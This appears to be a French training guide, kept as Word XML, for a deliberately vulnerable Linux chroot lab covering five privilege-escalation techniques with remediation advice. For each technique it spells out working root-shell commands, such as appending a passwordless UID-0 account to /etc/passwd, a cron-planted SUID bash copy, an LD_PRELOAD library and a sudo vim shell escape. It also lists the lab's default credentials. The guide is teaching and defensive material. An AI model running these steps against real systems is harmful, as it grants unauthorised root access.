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JAIL v2 — Laboratoire de Privilege Escalation Linux</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="646464"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Guide pedagogique complet pour formateurs et eleves</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C83232"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Usage strictement reserve a un lab isole / CTF interne</w:t>
        <w:br/>
        <w:t>Ref. : Art. 323-1 du Code penal — ANSSI Guide Hygiene v3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Presentation du lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>JAIL v2 est un environnement chroot SSH vulnerable concu pour l'apprentissage des techniques d'elevation de privileges sous Linux. L'utilisateur "jailed" est enferme dans un chroot via la configuration SSH (Match User + ChrootDirectory) avec un jeu limite de binaires.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Le lab couvre 5 techniques de privilege escalation :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - SUID Bit Exploitation</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Writable /etc/passwd</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Cron Job Hijacking</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - LD_PRELOAD Injection</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Sudo + Vim Escape</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Installation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Prerequis : Debian 11/12 (installation minimale), acces root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Etapes d'installation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>su -</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>apt update &amp;&amp; apt upgrade -y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>apt install git dos2unix -y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>cd /opt &amp;&amp; git clone https://github.com/Slurptheworld/Jail.git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>cd Jail &amp;&amp; dos2unix *.sh &amp;&amp; chmod +x *.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>./setup_jail.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Note : </w:t>
      </w:r>
      <w:r>
        <w:t>Le script setup_jail.sh installe automatiquement les dependances manquantes (vim, python3, gcc) et configure le chroot SSH (bloc Match User dans sshd_config). Aucune configuration manuelle n'est necessaire.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Structure du chroot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>/home/jailed/           # Racine du chroot (ChrootDirectory)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  bin/                  # bash, rbash, ls, cat, mkdir, rm, touch,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                        # python3, vim, env, find, grep, chmod,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                        # id, whoami, su, gcc</w:t>
        <w:br/>
        <w:t xml:space="preserve">  lib/ &amp; lib64/         # Bibliotheques dynamiques (arborescence reelle)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  etc/                  # passwd, group, shadow, sudoers, pam.d, cron.d</w:t>
        <w:br/>
        <w:t xml:space="preserve">  tmp/                  # Zone d'ecriture pour les exploits</w:t>
        <w:br/>
        <w:t xml:space="preserve">  proc/                 # Monte par vuln_sudo_vim.sh</w:t>
        <w:br/>
        <w:t xml:space="preserve">  dev/                  # null, tty, urandom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Mecanisme de chroot SSH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IMPORTANT : </w:t>
      </w:r>
      <w:r>
        <w:t>Le chroot SSH est le mecanisme qui enferme reellement l'utilisateur jailed dans /home/jailed lors de la connexion SSH. Sans cette configuration, l'utilisateur accede au systeme de fichiers complet.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Configuration ajoutee dans /etc/ssh/sshd_config :</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  Match User jailed</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ChrootDirectory /home/jailed</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ForceCommand /bin/bash</w:t>
        <w:br/>
        <w:t xml:space="preserve">      AllowTcpForwarding no</w:t>
        <w:br/>
        <w:t xml:space="preserve">      X11Forwarding no</w:t>
        <w:br/>
        <w:br/>
        <w:t>Prerequis du ChrootDirectory :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - /home/jailed et tous ses parents doivent appartenir a root:root</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - /home/jailed doit etre en 755 (pas d'ecriture par groupe/others)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - ForceCommand pointe vers /bin/bash (chemin DANS le chroot)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - SSH est redemarre apres modification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Identifiants</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Utilisateur</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Mot de passe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Acces</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>jailed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>password123</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SSH → Chroot</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Connexion : ssh jailed@&lt;IP_DEBIAN&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Vulnerabilites &amp; Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C89600"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>ROLES — Formateur vs Eleve</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C83232"/>
        </w:rPr>
        <w:t xml:space="preserve">FORMATEUR (root sur Debian) : </w:t>
      </w:r>
      <w:r>
        <w:t>Active les vulnerabilites cote serveur avec les scripts vuln_*.sh. Il prepare l'environnement AVANT que l'eleve ne se connecte.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="329632"/>
        </w:rPr>
        <w:t xml:space="preserve">ELEVE (SSH en tant que jailed) : </w:t>
      </w:r>
      <w:r>
        <w:t>Se connecte en SSH (ssh jailed@&lt;IP&gt;) et doit decouvrir puis exploiter les failles sans connaitre les scripts. Outils disponibles : find, grep, id, whoami, sudo -l, ls -la.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 SUID Bit Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Theorie : Quand un binaire possede le bit SUID (Set User ID), il s'execute avec les droits de son proprietaire (root). Si /bin/bash est SUID root, l'option -p (preserve privileges) permet d'ouvrir un shell root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Activation (formateur) : </w:t>
      </w:r>
      <w:r>
        <w:t>sudo ./vuln_suid.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exploitation (eleve) :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. find / -perm -4000 -type f 2&gt;/dev/null    # Trouver les SUID</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. /bin/bash -p                               # Shell root</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. whoami                                     # → root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Remediation : </w:t>
      </w:r>
      <w:r>
        <w:t>Ne jamais appliquer SUID sur des shells. Auditer avec find / -perm -4000. Utiliser les capabilities Linux au lieu de SUID.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Writable /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Theorie : /etc/passwd contient la liste des comptes. Si un utilisateur non privilege peut y ecrire, il peut ajouter un compte avec UID 0 (root) sans mot de passe, puis basculer dessus avec su.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Activation (formateur) : </w:t>
      </w:r>
      <w:r>
        <w:t>sudo ./vuln_passwd.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exploitation (eleve) :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. ls -la /etc/passwd                        # Verifier permissions (666)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. echo 'hacker::0:0:hacker:/root:/bin/bash' &gt;&gt; /etc/passwd</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. su hacker                                  # Shell root sans mdp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Remediation : </w:t>
      </w:r>
      <w:r>
        <w:t>chmod 644 /etc/passwd. Surveillance d'integrite (AIDE, OSSEC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 Cron Job Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Theorie : Cron execute des scripts a intervalles reguliers avec les droits specifies (souvent root). Si le script est modifiable par un attaquant, il peut y injecter du code qui s'executera en root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Activation (formateur) : </w:t>
      </w:r>
      <w:r>
        <w:t>sudo ./vuln_cron.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exploitation (eleve) :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. cat /etc/cron.d/vuln_cron                 # Identifier le cron</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. echo '#!/bin/bash' &gt; /tmp/malicious.sh</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash' &gt;&gt; /tmp/malicious.sh</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4. chmod +x /tmp/malicious.sh</w:t>
        <w:br/>
        <w:t xml:space="preserve">  5. # Attendre 60 secondes...</w:t>
        <w:br/>
        <w:t xml:space="preserve">  6. /tmp/rootbash -p                          # Shell root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Remediation : </w:t>
      </w:r>
      <w:r>
        <w:t>Fichiers cron en 644 appartenant a root. Scripts immutables (chattr +i). Chemins absolus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 LD_PRELOAD Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Theorie : LD_PRELOAD force le chargement d'une bibliotheque partagee avant toutes les autres. Si un binaire SUID (env) execute une commande, on peut injecter une lib malveillante avec une fonction _init() qui ouvre un shell root.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Activation (formateur) : </w:t>
      </w:r>
      <w:r>
        <w:t>sudo ./vuln_ldpreload.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exploitation (eleve) :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. Creer exploit.c avec _init() → setuid(0) + system("/bin/bash")</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. env LD_PRELOAD=/tmp/exploit.so /bin/ls    # Shell root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Remediation : </w:t>
      </w:r>
      <w:r>
        <w:t>Pas de SUID sur env. Restreindre gcc en production. Compilation statique des binaires critiques.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.5 Sudo + Vim Escape</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Theorie : Si sudo autorise un utilisateur a executer vim en tant que root (via sudoers), l'editeur Vim permet de lancer un shell depuis son mode commande avec :shell ou :!/bin/bash. C'est un "escape to shell" classique documente sur GTFOBins (https://gtfobins.github.io/gtfobins/vim/).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Activation (formateur) : </w:t>
      </w:r>
      <w:r>
        <w:t>sudo ./vuln_sudo_vim.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ce script installe dans le chroot :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - sudo (binaire SUID)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - PAM (pam_permit.so pour NOPASSWD)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - NSS (nsswitch.conf + libnss_files)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - /etc/passwd, /etc/group, /etc/shadow</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - /etc/sudoers + /etc/sudoers.d/vuln_vim (jailed ALL=(ALL) NOPASSWD: /bin/vim)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - /proc (monte)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exploitation (eleve) :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  1. sudo -l                                   # Reperer NOPASSWD: /bin/vim</w:t>
        <w:br/>
        <w:t xml:space="preserve">  2. sudo /bin/vim                             # Lancer vim en root</w:t>
        <w:br/>
        <w:t xml:space="preserve">  3. :set shell=/bin/bash                       # Dans vim</w:t>
        <w:br/>
        <w:t xml:space="preserve">  4. :shell                                    # Escape to shell</w:t>
        <w:br/>
        <w:t xml:space="preserve">  5. whoami                                    # → root</w:t>
        <w:br/>
        <w:br/>
        <w:t>Alternative en une commande :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  sudo vim -c ':!/bin/bash'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Remediation : </w:t>
      </w:r>
      <w:r>
        <w:t>Ne jamais donner sudo sur des editeurs (vim, nano, less, more, man). Utiliser sudoedit au lieu de sudo vim. Consulter GTFOBins avant d'ajouter un binaire dans sudoers. Appliquer le principe du moindre privilege.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Commandes de detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Commandes disponibles dans le chroot pour la phase de reconnaissance :</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  find / -perm -4000 -type f 2&gt;/dev/null   # Trouver les binaires SUID</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ls -la /etc/passwd                       # Verifier les permissions</w:t>
        <w:br/>
        <w:t xml:space="preserve">  cat /etc/cron.d/*                        # Lire les taches cron</w:t>
        <w:br/>
        <w:t xml:space="preserve">  sudo -l                                  # Lister les droits sudo</w:t>
        <w:br/>
        <w:t xml:space="preserve">  id                                       # Afficher UID/GID courant</w:t>
        <w:br/>
        <w:t xml:space="preserve">  whoami                                   # Afficher le nom d'utilisateur</w:t>
        <w:br/>
        <w:t xml:space="preserve">  grep -r "pattern" /etc/                  # Chercher dans les configs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Nettoyage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Apres le TP, executer le script de nettoyage en root :</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  sudo ./cleanup_jail.sh</w:t>
        <w:br/>
        <w:br/>
        <w:t>Ce script effectue :</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Demontage de /proc dans le chroot</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Suppression de l'utilisateur jailed</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Suppression de /home/jailed</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Suppression du bloc Match User dans sshd_config + restart SSH</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Suppression des regles sudoers vulnerables</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Nettoyage des taches cron et binaires SUID suspects</w:t>
        <w:br/>
        <w:t xml:space="preserve">  - Verification des permissions /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="C83232"/>
        </w:rPr>
        <w:t xml:space="preserve">IMPORTANT : </w:t>
      </w:r>
      <w:r>
        <w:t>Ne jamais laisser un environnement vulnerable actif au-dela du TP. Snapshot la VM avant, detruire apres.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Ressources</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GTFOBins : https://gtfobins.github.io/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HackTricks Linux PrivEsc : https://book.hacktricks.xyz/linux-hardening/privilege-escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE ATT&amp;CK : https://attack.mitre.org</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ANSSI Guide Hygiene v3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